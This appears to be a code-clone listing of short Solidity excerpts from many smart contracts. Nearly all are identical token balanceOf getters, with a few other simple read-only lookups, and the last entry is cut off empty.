<source file="systems/source-code/0x75d5d49F80871F23bEE1448070790A77C56d3d00.sol" startline="60" endline="62" pcid="4362">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x73D5168CeB5a4cE0d3f74a01A92e05305339DD61.sol" startline="67" endline="69" pcid="4239">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x4115454c188acFB9Cb67c6d795214055381b53B5.sol" startline="67" endline="69" pcid="2403">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xc3577998420272f181f6eb96b319aa31894fd373.sol" startline="21" endline="23" pcid="6993">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x4504921b0d800eca1770f89740b7aaa8f3f57fb9.sol" startline="68" endline="70" pcid="2573">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x0D33f227b588446F1Bff2b07AE00fF69EB086876.sol" startline="66" endline="68" pcid="344">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x2f6935cc4a043c0bf69165c791ce6f4361278715.sol" startline="66" endline="68" pcid="1444">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xF92050985936150572FCA5d8307bfd35771CDB54.sol" startline="59" endline="61" pcid="9074">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x25CbbcDdc474eD95A5539C382ba6F486b2EB8D84.sol" startline="66" endline="68" pcid="1197">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="404" endline="406" pcid="3694">
  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }
</source>
<source file="systems/source-code/0xfd0d43a6f56f17d6efe203410a9306a7953885e5.sol" startline="35" endline="37" pcid="9215">
    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
</source>
<source file="systems/source-code/0x42237AC5Aed08d64FEAE4817fa1F0282087447f7.sol" startline="66" endline="68" pcid="2433">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xA55a6E9BFC3Ba7cb2421146B8F111919bCfB0060.sol" startline="62" endline="64" pcid="6019">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x79868a92715cc6ba1829a46d292992d1c1945e6c.sol" startline="68" endline="70" pcid="4590">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xc601f3c40a8DE1f872AE056e7e21E255E740741A.sol" startline="46" endline="48" pcid="7113">
  function balanceOf(address player) public view returns (uint256) {
    return balances[player];
  }
</source>
<source file="systems/source-code/0x0232d83E731fB812b8A9A0497b75c73a1bC7655a.sol" startline="68" endline="70" pcid="80">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x9c03094376D96C2b5ffd1B1C5129b048438700CF.sol" startline="61" endline="63" pcid="5673">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x98D29fe112bFce3C568b3e7B56CA95F4f684f2E2.sol" startline="66" endline="68" pcid="5544">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x8fE05D10B3c7aE008165Db5FA6a472c25E666A7F.sol" startline="65" endline="67" pcid="5266">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x847d2f49E856550F93f7aADF444528a024256372.sol" startline="66" endline="68" pcid="4946">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xe33c37cddb31548856537434d103e57d99242efb.sol" startline="65" endline="67" pcid="8213">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="267" endline="269" pcid="8932">
    function getBlackListStatus(address _maker) external constant returns (bool) {
        return isBlackListed[_maker];
    }
</source>
<source file="systems/source-code/0x261771ae5888e4cc4f84eb74d9b2c931523272e9.sol" startline="580" endline="582" pcid="1206">
    function balanceOf(address account) public view returns (uint256) {
        return t[account];
    }
</source>
<source file="systems/source-code/0xDc41DbF96D3641d64D46C2a9D805B2a7eA804438.sol" startline="62" endline="64" pcid="7818">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x5b80d34d9b91f7e424d4fb73aba7cf5647ead8fa.sol" startline="66" endline="68" pcid="3485">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x98dBba70df94bC4057a76E29067b5D5D5676f14c.sol" startline="66" endline="68" pcid="5559">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x1f3adE6D938122006C0Dc9fb893d767080123917.sol" startline="59" endline="61" pcid="974">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x569BFe249181f42c823bEBda9799e1E65f4254B6.sol" startline="65" endline="67" pcid="3237">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x8d1Ac863255DFA88B9028eC119f12ABC1062b767.sol" startline="63" endline="65" pcid="5170">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x2AE6bAa928cFeD647807104d4de73aA779a8f433.sol" startline="64" endline="66" pcid="1278">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xcAE6d8F16193526B9973C93096F0B9B788af999F.sol" startline="67" endline="69" pcid="7233">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x13aa62cE2b990807c069d04A61E8475c45a150E5.sol" startline="64" endline="66" pcid="517">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xefF6ee6e86feF5f6b61560a3c99e7DCFf53f7bb6.sol" startline="62" endline="64" pcid="8781">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="402" endline="404" pcid="8511">
  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }
</source>
<source file="systems/source-code/0x9f956D811170c17aEeA2382b44132520D7A63701.sol" startline="62" endline="64" pcid="5748">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x4d93ea7ef293ed2ca2d4cc9723f5e2c0c8e09dec.sol" startline="63" endline="65" pcid="2926">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x99D00D99221a9CFF03d0F48a6674b71A7d0893Fc.sol" startline="58" endline="60" pcid="5590">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x76bD48f622Df028AeD28cB121DdA887F84EA805B.sol" startline="66" endline="68" pcid="4431">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xBeC25691510e9A714648323DC55bEC5199719d52.sol" startline="682" endline="684" pcid="6824">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xd0cD86CA2768C13980fE496ca78bC72Ed8f2bE8B.sol" startline="66" endline="68" pcid="7441">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x1b7B0b213fB6B96fCFB754881175bb4422e39b52.sol" startline="66" endline="68" pcid="873">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xa71Cbe77C505140Cd10070401b82580E0Fe94a1B.sol" startline="69" endline="71" pcid="6103">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x492a83ad58177150c7519db98435f7Fa715D6022.sol" startline="63" endline="65" pcid="2764">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xa5bf4225edeFe7bdA05825b60D5497e2a5445F1e.sol" startline="63" endline="65" pcid="6034">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xE413f21F74faC68bCd2c16626f0FCa30b55692Dd.sol" startline="64" endline="66" pcid="8273">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x2e146811a317ba5Eb77209C942b186f67a65E801.sol" startline="66" endline="68" pcid="1369">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x527B878E22Db9747eeA5d5d5e6A241BB42634C5E.sol" startline="65" endline="67" pcid="3072">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x3ce7CAfDEB197967161757d8a44e60e9Bf58bC10.sol" startline="64" endline="66" pcid="2168">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x8760079142f48028f4e06656565667d2b66a040f.sol" startline="63" endline="65" pcid="5016">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x400ceeaef948d1DfE5fD1F2fa5a431Fb7e11a086.sol" startline="62" endline="64" pcid="2343">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x393150326998e07F1d4B3D013dB62c5D0890352A.sol" startline="66" endline="68" pcid="1883">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x5ad359AaC713929412c9b802175A9f12E5cf9306.sol" startline="63" endline="65" pcid="3455">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xe928e115184bad954b11c477df5e1fc94f04e45d.sol" startline="64" endline="66" pcid="8423">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x3c8B8B3D57AE533C8A34A290327024f915335CA9.sol" startline="65" endline="67" pcid="2134">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x374e2e0b414f5043e7afefdb7f2be47bcb9e349d.sol" startline="25" endline="27" pcid="1854">
    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }
</source>
<source file="systems/source-code/0xdea8f0f40066bbc20c044729f08d3c488e4603d8.sol" startline="64" endline="66" pcid="7958">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xe3294e522f9307592da7c9b290409772c6f89e5a.sol" startline="69" endline="71" pcid="8197">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x10682fF02FC98F7FB6ceA08e7a584262DB51a399.sol" startline="64" endline="66" pcid="432">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x6301C00FADD94F10409FC62E08215253fB838F46.sol" startline="63" endline="65" pcid="3773">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="323" endline="325" pcid="8110">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xfb3FCa7F38fEEAD4CbC677e8Ec4f3C159410ce18.sol" startline="66" endline="68" pcid="9143">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x0617c6f1b099dff080a44451a3882b42bfa75188.sol" startline="64" endline="66" pcid="174">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xA8752c38CaA247fC7724A2D8d4f04e2eD410d7AC.sol" startline="65" endline="67" pcid="6164">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x22E7f1B1300DBd955C689ac4Da292f938A4AEBFA.sol" startline="64" endline="66" pcid="1049">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="267" endline="269" pcid="4763">
    function getBlackListStatus(address _maker) external constant returns (bool) {
        return isBlackListed[_maker];
    }
</source>
<source file="systems/source-code/0x6068BB046aaF234EEa71A9d54Dd77d76D6dF5581.sol" startline="64" endline="66" pcid="3648">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x35539cc6f1f1c0449474fdaaa0939893457163da.sol" startline="64" endline="66" pcid="1783">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x59C507Cb69406B5975e70A3c3993AF74c11EF51d.sol" startline="66" endline="68" pcid="3387">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xeE35812e1254Da3Bd81eA1ba4275f2001085d671.sol" startline="62" endline="64" pcid="8691">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x44b5f46a20c2981d1bae28c3549365b9c6186931.sol" startline="31" endline="33" pcid="2548">
    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
</source>
<source file="systems/source-code/0xc17DC80eF016E918587Ea3ffb55894a8515519C1.sol" startline="63" endline="65" pcid="6939">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x89C8Eb764Ae4e7EF67f5E84f0eeE404a2Fb02bed.sol" startline="68" endline="70" pcid="5106">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xd6431990d48B3E463696fdc9860f866aFEB1e370.sol" startline="66" endline="68" pcid="7665">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xe0A9b2Cbd7147f9fb0fE09fAcD2aAB94C0f51444.sol" startline="682" endline="684" pcid="8075">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x31dD70842e7443108905d50c216F2CeDb452E80a.sol" startline="66" endline="68" pcid="1562">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x3943a56c7b1efd43c3c952aec05cb295f0ab8c67.sol" startline="60" endline="62" pcid="1898">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x23ffd2f59ec758388282634cda63d6dc1e3120f2.sol" startline="138" endline="140" pcid="1092">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xe884A9b4fCBB75a6bBAD1d344DAaD8a5F3D0ba2A.sol" startline="61" endline="63" pcid="8393">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xf49f16cd3370fB4cCD6C99e1C6F465d53fdec793.sol" startline="66" endline="68" pcid="8910">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x5C1f1986b0cD5EF29A7528f59DC0dC03060dE44E.sol" startline="59" endline="61" pcid="3528">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x36Ce9629522814955bc7CE5eAC7313BDFB6AC136.sol" startline="330" endline="332" pcid="1808">
    function balanceOf(address account) external view returns (uint) {
        return balances[account];
    }
</source>
<source file="systems/source-code/0xaE962d11E0a74cE271f7a111a0C3F538eD3DeDE6.sol" startline="64" endline="66" pcid="6363">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x3fb9d6a99375a51fd64641bd6e1fd6dd310b74e4.sol" startline="57" endline="59" pcid="2299">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x22348b2351817d12C0a89c35AF96B919544D7398.sol" startline="63" endline="65" pcid="1034">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x93641b862C7C657138896678Ab745592D7072C15.sol" startline="64" endline="66" pcid="5354">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xccD47BEeEf5E57708853902581289A950E4E9722.sol" startline="64" endline="66" pcid="7279">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x8Dfec76a1104A22faAD1c7Ba7A90d9508e3eF5a7.sol" startline="62" endline="64" pcid="5200">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xecF790443697567D67022c757ABE80ac4648dA0E.sol" startline="66" endline="68" pcid="8670">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x56b05991e5ed8d0ABD6B60FabdB55e1def0864D8.sol" startline="65" endline="67" pcid="3252">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x8d9579e8591826ef37C80f680e33B6C8c38baB47.sol" startline="64" endline="66" pcid="5185">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x8f5b2832b8D440cf00B5Ef5a37d12DC9d96F0839.sol" startline="65" endline="67" pcid="5251">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xc18250a3Ca19Da5214B0B7A16c788726139d0b00.sol" startline="66" endline="68" pcid="6954">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x0b84Fa92739e6704EEb6658AfdA59747215B496A.sol" startline="65" endline="67" pcid="306">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xf448f730a7d85678497BE0E4B939D197763A5460.sol" startline="63" endline="65" pcid="8895">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xFc9804E65cC6E47964c809b9f704440DFb8C5eA0.sol" startline="62" endline="64" pcid="9206">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x3Ad865f49cb532cE565677635F9ED7b3CbF27A5d.sol" startline="236" endline="238" pcid="1978">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x2EE5459A05D2DCF76699D0A383EdAcD6e5A8Ee03.sol" startline="64" endline="66" pcid="1414">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xdeE18b2a1ac44f22E4E3Ee3de6AeD146877bCe50.sol" startline="66" endline="68" pcid="7973">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x92Fb66bAcacDeB0BFf34538D805521F1019dce1a.sol" startline="61" endline="63" pcid="5332">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xF0098c03f5544FcC13F8f4DeB183527801B6B40D.sol" startline="65" endline="67" pcid="8796">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x1E453405B5B7656ae31B7cCBb783979723244327.sol" startline="65" endline="67" pcid="940">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x7564011A8636815Db93dE33ceD4a65Ea0A8CF337.sol" startline="63" endline="65" pcid="4316">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="271" endline="273" pcid="7404">
    function getBlackListStatus(address _maker) external constant returns (bool) {
        return isBlackListed[_maker];
    }
</source>
<source file="systems/source-code/0xb0549cac8a2bf3f5d65e5d7b713f33a9eaca6768.sol" startline="61" endline="63" pcid="6481">
    function balanceOf(address account) public view returns (uint256) {
        return _NFT[account];
    }
</source>
<source file="systems/source-code/0x3D0ff3246C0C91DDF19688A8CAE0b3F9FfFB5090.sol" startline="68" endline="70" pcid="2198">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x14cf1d2a1da97600a7489c87a6d8bb57eb1fbc07.sol" startline="46" endline="48" pcid="589">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xa0EeeaeA46e92b35849f6F3afC9C63478A0967A0.sol" startline="65" endline="67" pcid="5782">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x6a5187F14C2b01BebF7E60A6BCac513D4fc5F144.sol" startline="63" endline="65" pcid="3925">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x6bd91799f767b30b1f7aeb1239b3573b2e366b49.sol" startline="63" endline="65" pcid="3955">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x5ABbDae4e6d7c89640129E87409C8F991CeE5174.sol" startline="66" endline="68" pcid="3440">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xa6Bbb91fC7029E259F590195C21C57D26F480835.sol" startline="65" endline="67" pcid="6088">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x584535e0ce218addde8af49c308F25aAb7033E53.sol" startline="64" endline="66" pcid="3308">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x508A3908572F7697CF8A13c2A95642122C3Ab43B.sol" startline="65" endline="67" pcid="2960">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x3aE19CA727e6c9C06dA578fB34113aF9aC0676ee.sol" startline="66" endline="68" pcid="2000">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x8EB829589a20Aa412577544cD6e9732087B691AB.sol" startline="148" endline="150" pcid="5230">
    function balanceOf(address owner) public view returns (uint256) {
        return _balances[owner];
    }
</source>
<source file="systems/source-code/0x24EdaAAdB4EA4C7aa6CAe4dBB0D0a93C8F5FF180.sol" startline="62" endline="64" pcid="1145">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x42549293c0df3d2eb5ef99722aab9b7228f885a3.sol" startline="64" endline="66" pcid="2448">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xEb0753dfACc48178d482640e009ec23334a91Dc5.sol" startline="63" endline="65" pcid="8550">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x1A2d73a3c991da558bcAeE1f02408fe5a9471afa.sol" startline="63" endline="65" pcid="833">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x3c44f3b816Dac7abDe925fDBB52448b9aB23f623.sol" startline="62" endline="64" pcid="2109">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xF3E3E0381509e1B6a83f0D8E41b7219777010A51.sol" startline="65" endline="67" pcid="8880">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x4BAdfe3A6691C6d4842075C861dB965597E4D895.sol" startline="62" endline="64" pcid="2821">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x951f6AC91566cC392D051278A1E921ECF56a9B6F.sol" startline="62" endline="64" pcid="5402">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x73095365CF296E26D912E095C38FAc6b3fFAD3AF.sol" startline="66" endline="68" pcid="4224">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x1684f783064B9F4D6273e9ed11F5D753C193E5E5.sol" startline="66" endline="68" pcid="678">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="568" endline="570" pcid="4554">
    function getRefOf(address _address) public view returns (address) {
        return refOfs[_address];
    }
</source>
<source file="systems/source-code/0xfb43f573a247cbcb8bd9a366d0afb31f4dba1e55.sol" startline="64" endline="66" pcid="9158">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x075D3f6AcC15Caf4F8699D72Bc760A09f5842C3f.sol" startline="66" endline="68" pcid="189">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x983E15495E359Da37330E515D0a4326d502c0356.sol" startline="62" endline="64" pcid="5497">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xCDFcbB5be93d37A33C85ffd7828dDDd332823349.sol" startline="62" endline="64" pcid="7310">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x3505c70Dbf2Cc4ECD84Dd0Bed04f8126c26Ab909.sol" startline="69" endline="71" pcid="1666">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x6d1456049210842b851a60C4ca116179658eF07a.sol" startline="64" endline="66" pcid="4015">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x70cf354cea658dc809b6f860d73d5a29088c19a6.sol" startline="27" endline="29" pcid="4141">
    function balanceOf(address account) public view returns (uint256) {
        return t[account];
    }
</source>
<source file="systems/source-code/0xcf0f68bcabb63cc736d8a301ce2372302454be3d.sol" startline="136" endline="138" pcid="7363">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="588" endline="590" pcid="4559">
    function getClaimed(address buyer) public view returns (uint256) {
        return claimers[buyer];
    }
</source>
<source file="systems/source-code/0xe10f1b5466b361c9c8c735021A6d00CDea855763.sol" startline="65" endline="67" pcid="8090">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xa6AC064774bF25B7Ee251C3F051Aabf28A01DCb4.sol" startline="63" endline="65" pcid="6073">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x33F474718b13546c5A717Ff1Fbd2d8BcaB6Fdd45.sol" startline="64" endline="66" pcid="1595">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x7620F8bE1A98a4F0CE86B9817767dc565C56eDF3.sol" startline="63" endline="65" pcid="4386">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x13d0A3A7D4Ca790E93874a93ED664a301291bBEe.sol" startline="63" endline="65" pcid="532">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x53b2517B208ee8DCEBa690d57520d7798A087D17.sol" startline="66" endline="68" pcid="3102">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xca7d2118fbfaac126a51d403c2f73eff4af97a1a.sol" startline="60" endline="62" pcid="7215">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x6Bf6EE9e148031D538521BB8Ed8658C6Fe12391a.sol" startline="64" endline="66" pcid="3970">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xc09fB61CD91439C2CB8f8554f701c33cECA47a25.sol" startline="66" endline="68" pcid="6894">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x6232C9abFD76F7052d359e1a277e3a4D2377A3e3.sol" startline="137" endline="139" pcid="3739">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x821d158c454B3a3Fcef1B9f35DBa9cb0e37C5453.sol" startline="65" endline="67" pcid="4856">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0xb5c5017c98549049c1d1Cf46e3d0eA7882a21B33.sol" startline="66" endline="68" pcid="6610">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x3769cd9532CcE8550984AA8388a26Beda0E69401.sol" startline="68" endline="70" pcid="1864">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x9ed015445e359b0Dca0A93e34af01d9Dc90D3B26.sol" startline="62" endline="64" pcid="5718">
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
</source>
<source file="systems/source-code/0x91448BdD0ef6810de6E4a8B3Ba82590ab70D5b95.sol" startline="65" endline="67" pcid="5317">
